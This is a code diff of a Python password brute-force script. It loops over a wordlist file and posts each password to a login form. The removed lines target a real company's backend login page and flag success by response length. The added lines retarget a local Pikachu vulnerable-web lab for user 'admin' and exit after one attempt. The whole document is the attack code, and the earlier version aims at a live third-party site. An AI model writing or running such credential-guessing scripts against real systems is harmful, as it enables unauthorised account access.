@@ -1,15 +1,14 @@
 import requests
-URL="https://www.namtai.com/backend/account/login.html?class=form-validation&name=loginform"
+import re
+line = "username or password"
+URL="http://127.0.0.1/pikachu/vul/burteforce/bf_form.php"
+data={"username":"admin","password":""}
 with open("/mnt/home/CocRes/Password/pass.txt","r") as f:
     for i in f.readlines():
-        data={"user":"","password":""}
-        flag=requests.post(url=URL,data=data).content
-        flag = str(flag,encoding="utf-8")
-        print(len(flag))
-        print(i.strip())
-        if len(flag) != 1574:
-            print(flag)
-            print("password:"+i)
-            print('\n')
-            break
+        data['password'] = i.split()
+        print('密码：' + str(i.split()))
+        res=requests.post(url=URL,data=data)
+        res = res.content.decode("utf-8")
+        print(res)
+        exit()
 
